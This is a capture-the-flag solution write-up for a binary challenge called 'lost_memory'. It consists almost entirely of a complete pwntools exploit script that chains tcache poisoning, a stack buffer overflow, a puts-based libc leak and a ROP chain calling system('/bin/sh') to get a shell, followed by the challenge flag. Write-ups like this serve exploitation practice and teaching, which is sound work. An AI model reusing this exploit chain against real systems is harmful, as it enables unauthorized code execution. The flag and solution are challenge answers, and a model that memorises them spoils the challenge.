# Solution

Heap Exploit + Stack Exploit
Heap Tcache Poisoning -> local variable buffer overflow -> ROPPING to leak LibC by calling puts plt -> repeat but ROPPING to system('/bin/sh')

```
from pwn import *

def con(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	elif args.GDB:
		return gdb.debug(exe, gdbscript='''
            b *0x000000000040175b
			c
			''')
	else:
		return process(exe, env={"LD_PRELOAD":"./libc.so.6"})


exe = './lost_memory'
io = con()
elf = context.binary = ELF(exe, checksec = False)

context.log_level = 'debug'

#---------------------------------------------------------------------

info(f"Allocating ")
io.sendlineafter(b'choice:\n',b'3')
io.sendlineafter(b'(0 - 9)\n',b'0')
io.sendlineafter(b'choice:\n',b'1')
io.sendlineafter(b'like?\n',b'128')
io.sendlineafter(b'choice:\n',b'3')
io.sendlineafter(b'(0 - 9)\n',b'1')
io.sendlineafter(b'choice:\n',b'1')
io.sendlineafter(b'like?\n',b'128')
info("Allocation done")
info("Freeing Memory")
io.sendlineafter(b'choice:\n',b'3')
io.sendlineafter(b'(0 - 9)\n',b'1')
io.sendlineafter(b'choice:\n',b'4')

io.sendlineafter(b'choice:\n',b'3')
io.sendlineafter(b'(0 - 9)\n',b'0')
io.sendlineafter(b'choice:\n',b'4')
info("Freeing done")

io.sendlineafter(b'choice:\n',b'5')
io.recvuntil(b'value: ')
leak = int(io.recvline().strip(),16)

info("Storing flag")
info(f"Leaked: {hex(leak)}")
io.sendlineafter(b'choice:\n',b'1')
io.sendlineafter(b'like?\n',b'128')
io.sendlineafter(b'choice:\n',b'1')
io.sendlineafter(b'like?\n',b'128')
io.sendlineafter(b'choice:\n',b'2')
offset = 24
pop_rdi = 0x000000000040132e
ret = 0x000000000040101a
payload = b'/flag\x00\x00\00'
payload += b'A' * 24
payload += p64(pop_rdi) + p64(elf.got['printf']) + p64(elf.plt['puts']) 
payload +=  p64(elf.sym['main'])
io.sendlineafter(b'write?\n',payload)
io.sendlineafter(b'choice:\n',b'6')
io.recvuntil(b'Exiting...\n')
printf_leak = unpack(io.recv(6).ljust(8,b'\x00'))
libc = ELF('./libc.so.6')

print(f"leaked_printf: {hex(printf_leak)}")
libc_base = printf_leak - libc.sym['printf']

libc.address = libc_base
info(f"Libc Base: {hex(libc.address)}")
#
# next stage


io.sendlineafter(b'choice:\n',b'3')
io.sendlineafter(b'(0 - 9)\n',b'0')
io.sendlineafter(b'choice:\n',b'1')
io.sendlineafter(b'like?\n',b'128')
io.sendlineafter(b'choice:\n',b'3')
io.sendlineafter(b'(0 - 9)\n',b'1')
io.sendlineafter(b'choice:\n',b'1')
io.sendlineafter(b'like?\n',b'128')
info("Allocation done")
info("Freeing Memory")
io.sendlineafter(b'choice:\n',b'3')
io.sendlineafter(b'(0 - 9)\n',b'1')
io.sendlineafter(b'choice:\n',b'4')

io.sendlineafter(b'choice:\n',b'3')
io.sendlineafter(b'(0 - 9)\n',b'0')
io.sendlineafter(b'choice:\n',b'4')
info("Freeing done")

io.sendlineafter(b'choice:\n',b'5')
io.recvuntil(b'value: ')
leak = int(io.recvline().strip(),16)

info("Storing flag")
info(f"Leaked: {hex(leak)}")
io.sendlineafter(b'choice:\n',b'1')
io.sendlineafter(b'like?\n',b'128')
io.sendlineafter(b'choice:\n',b'1')
io.sendlineafter(b'like?\n',b'128')
io.sendlineafter(b'choice:\n',b'2')

payload = b'/flag\x00\x00\00'
payload += b'A' * 24
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))

payload += p64(ret)
payload += rop.chain()
io.sendlineafter(b'write?\n',payload)
io.sendlineafter(b'choice:\n',b'6')
io.recvuntil(b'Exiting...\n')
#--------------------------------------------------------------------
io.interactive()
lost_memory_exploit.py
4 KB
```

Flag: `flag{2658c992bda627329ed2a8e6225623c6}`

Solved by: CapangJabba
